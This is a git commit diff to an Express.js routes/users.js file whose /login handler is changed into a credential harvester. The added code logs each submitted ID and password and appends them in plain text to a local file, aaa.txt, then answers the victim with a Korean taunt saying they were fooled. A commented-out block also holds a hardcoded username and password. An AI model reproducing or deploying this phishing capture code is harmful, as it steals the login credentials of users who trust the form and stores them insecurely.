5693949669134009205e03491653465c5c493978
David041219 <neverdie1219@gmail.com>
2019-04-07 12:06:05 +0900

    2019 4월 7일

--- routes/users.js
+++ routes/users.js
@@ -1,13 +1,14 @@
 var express = require('express');
+var fs = require('fs');
 var router = express.Router();
 
 /* GET users listing. */
-router.get('/', function(req, res, next) {
+router.get('/', function (req, res, next) {
   res.send('respond with a resource');
 });
 
 
-router.post('/login', function(req, res, next) {
+router.post('/login', function (req, res, next) {
   /*if(req.body.ID=='neverdie1219'){
     if(req.body.PW=='qweqwe12'){
       res.send('login 성공');
@@ -24,6 +25,15 @@ router.post('/login', function(req, res, next) {
 
   console.log('입력된 ID: ', req.body.ID);
   console.log('입력된 PW: ', req.body.PW);
+
+  var data = '아이디: '+req.body.ID+' / 비번: '+req.body.PW+"\n"+"-------------------------------"+"\n";
+  console.log(data);
+
+  fs.appendFile('aaa.txt', data, 'utf8', function (error, data) {
+    if (error) { throw error };
+    console.log('성공');
+  })
+
   res.send('앙 속았띠ㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋ');
 });
 
